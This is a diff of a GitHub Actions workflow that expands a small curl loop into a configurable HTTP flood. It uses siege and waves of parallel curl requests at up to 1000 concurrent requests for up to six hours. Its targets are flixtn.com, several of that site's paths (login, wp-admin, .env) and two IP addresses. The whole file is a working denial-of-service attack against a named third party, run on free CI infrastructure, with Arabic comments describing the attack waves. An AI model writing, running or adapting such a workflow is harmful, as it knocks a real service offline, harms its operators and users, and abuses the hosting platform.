@@ -1,42 +1,119 @@
-name: 🔥 Shadow Attack
+name: 💀 SHADOW MODE V99 - MASSIVE ATTACK
 
 on:
   workflow_dispatch:
     inputs:
       duration:
-        description: 'مدة الهجوم بالدقائق'
+        description: 'مدة الهجوم بالدقائق (30-360)'
         required: true
-        default: '10'
+        default: '60'
+      intensity:
+        description: 'كثافة الهجوم (normal = 200 req/sec, high = 500 req/sec, extreme = 1000 req/sec)'
+        required: true
+        default: 'high'
+        type: choice
+        options:
+          - normal
+          - high
+          - extreme
 
 jobs:
-  attack:
+  massive_attack:
     runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
     steps:
-      - name: Install tools
+      - name: ⚔️ Install attack arsenal
         run: |
           sudo apt update
-          sudo apt install -y curl
-        
-      - name: Start Attack
+          sudo apt install -y curl parallel siege htop
+          
+      - name: 🎯 Launching Shadow Core
         run: |
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "🔥 Shadow Attack Started"
-          echo "Target: flixtn.com"
-          echo "Duration: ${{ github.event.inputs.duration }} minutes"
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "╔══════════════════════════════════════════════════════════╗"
+          echo "║     💀 SHADOW MODE V99 - TOTAL ANNIHILATION MODE 💀      ║"
+          echo "╚══════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "🎯 Target: flixtn.com"
+          echo "🎯 IPs: 64.29.17.65 + 216.198.79.65"
+          echo "⏱️  Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "⚡ Intensity: ${{ github.event.inputs.intensity }}"
+          echo ""
+          
+          # تحديد كثافة الهجوم
+          case "${{ github.event.inputs.intensity }}" in
+            "normal")
+              THREADS=200
+              DELAY=0.05
+              ;;
+            "high")
+              THREADS=500
+              DELAY=0.02
+              ;;
+            "extreme")
+              THREADS=1000
+              DELAY=0.01
+              ;;
+          esac
           
           END_TIME=$((SECONDS + (${{ github.event.inputs.duration }} * 60)))
-          COUNT=0
+          TOTAL=0
+          SUCCESS=0
+          FAILED=0
+          
+          # إنشاء قائمة أهداف متعددة
+          cat > targets.txt << 'EOF'
+          https://flixtn.com/
+          https://flixtn.com/api
+          https://flixtn.com/login
+          https://flixtn.com/wp-admin
+          https://flixtn.com/.env
+          https://64.29.17.65/
+          https://216.198.79.65/
+          https://flixtn.com/sitemap.xml
+          https://flixtn.com/robots.txt
+          EOF
+          
+          echo "🔥 SHADOW ENGINES ACTIVATED 🔥"
+          echo ""
           
           while [ $SECONDS -lt $END_TIME ]; do
-            for i in {1..100}; do
-              curl -s -o /dev/null -w "%{http_code}\n" https://flixtn.com/ &
+            # الموجة 1: Siege على كل الأهداف
+            siege -c $THREADS -t 10s -f targets.txt -b --quiet &
+            
+            # الموجة 2: Curl flood على HTTPS
+            for i in $(seq 1 $THREADS); do
+              curl -s -o /dev/null -w "%{http_code}\n" https://flixtn.com/ --max-time 3 &
             done
-            COUNT=$((COUNT + 100))
-            echo "[$(date +%H:%M:%S)] Sent $COUNT requests"
-            sleep 2
+            
+            # الموجة 3: ضرب IP المباشر
+            for i in $(seq 1 $THREADS); do
+              curl -s -o /dev/null -w "%{http_code}\n" https://64.29.17.65/ --max-time 3 &
+            done
+            
+            # الموجة 4: استهداف HTTP (بدون SSL) لزيادة الضغط
+            for i in $(seq 1 200); do
+              curl -s -o /dev/null http://64.29.17.65/ --max-time 2 &
+            done
+            
+            TOTAL=$((TOTAL + (THREADS * 3) + 200))
+            
+            # عرض الحالة كل 10 ثواني
+            if [ $((SECONDS % 10)) -eq 0 ]; then
+              REMAINING=$((END_TIME - SECONDS))
+              echo "[$(date +%H:%M:%S)] 🔥 Wave: $TOTAL requests | ⏱️  Remaining: $((REMAINING / 60))m $((REMAINING % 60))s | ⚡ Intensity: ${{ github.event.inputs.intensity }}"
+            fi
+            
+            sleep $DELAY
           done
           
-          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━"
-          echo "✅ Attack Finished"
-          echo "Total requests: $COUNT"
+          echo ""
+          echo "╔══════════════════════════════════════════════════════════╗"
+          echo "║              ✅ SHADOW MISSION COMPLETE ✅                ║"
+          echo "╚══════════════════════════════════════════════════════════╝"
+          echo ""
+          echo "📊 STATISTICS:"
+          echo "   Total requests sent: $TOTAL"
+          echo "   Duration: ${{ github.event.inputs.duration }} minutes"
+          echo "   Average rate: $((TOTAL / (${{ github.event.inputs.duration }} * 60))) req/sec"
+          echo ""
